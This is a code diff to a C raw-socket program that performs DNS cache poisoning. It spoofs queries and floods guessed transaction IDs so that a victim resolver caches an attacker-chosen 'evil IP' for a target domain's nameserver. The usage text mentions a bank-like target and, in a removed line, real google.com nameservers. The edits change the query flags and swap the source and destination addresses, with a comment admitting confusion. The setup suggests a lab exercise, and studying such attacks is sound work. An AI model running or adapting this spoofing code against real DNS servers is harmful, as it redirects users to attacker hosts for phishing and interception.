@@ -256,8 +256,8 @@ unsigned int generate_dns_question (
     // data is the pointer points to the first byte of the dns payload  
     unsigned char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));
 
-    //standart response
-	dns->flags=htons(FLAG_R);
+    //standard query
+	dns->flags=htons(FLAG_Q);
     //Random transaction ID
     dns->query_id=rand();
 
@@ -386,15 +386,13 @@ int main(int argc, char **argv)
 
     if(argc != 8) {
         printf("Usage: \
-            \n\targv[1] - SRC IP (your computer), \
-            \n\targv[2] - DST IP (victim nameserver) , \
+            \n\targv[1] - SRC IP (attacker's computer), \
+            \n\targv[2] - DST IP (victim dns server) , \
             \n\targv[3] - TARGET DOMAIN'S NAMESERVER (example: ns1.BankOfShlomi.com) \
             \n\targv[4] - TARGET DOMAIN'S NAMESERVER IP (IP of ns1.BankOfShlomi.com \
             \n\targv[5] - EVIL IP (the victim will store this IP, it should be evil) \
             \n\targv[6] - QUERY COUNT (xxx.example.com where xxxx is 0 to 9999) \
             \n\targv[7] - ANSWER(GUESS) COUNT PER QUERY (TXID GUESS - max is 64000)\
-            \nExample: \
-            \n\tsudo ./a.out 127.0.0.1 127.0.0.1 google.com ns1.google.com 216.239.32.10 6.6.6.6 9999 64000\
             \n");
         //You can use DIG tool (dig NS google.com) to find name servers
         exit(-1);
@@ -441,8 +439,11 @@ int main(int argc, char **argv)
     sin.sin_port = htons(33333);
     din.sin_port = htons(53);
     // IP addresses
-    sin.sin_addr.s_addr = inet_addr(src_ip); // this is the second argument we input into the program
-    din.sin_addr.s_addr = inet_addr(dst_ip); // this is the first argument we input into the program
+
+//i have no idea why but these 2 lines, when arguments are switched, dns server doesn't receive packets, even though in attacker's wireshark it does send
+//so dont switch dst_ip and src_ip here
+    sin.sin_addr.s_addr = inet_addr(dst_ip);
+    din.sin_addr.s_addr = inet_addr(src_ip); 
 
     // buffer to hold the packet
     char buffer[PCKT_LEN];
@@ -495,7 +496,7 @@ int main(int argc, char **argv)
             //*txid_ptr = (*txid_ptr) + htons(1); //htons is very important! Big edian only!
             uint16_t tmp = ntohs(*txid_ptr);
             tmp += 1;
-            *txid_ptr = htons(tmp);
+            *txid_ptr = htons(tmp);       
         }
     }
 
@@ -504,4 +505,5 @@ int main(int argc, char **argv)
     close(sd);
     return 0;
 }
+
 
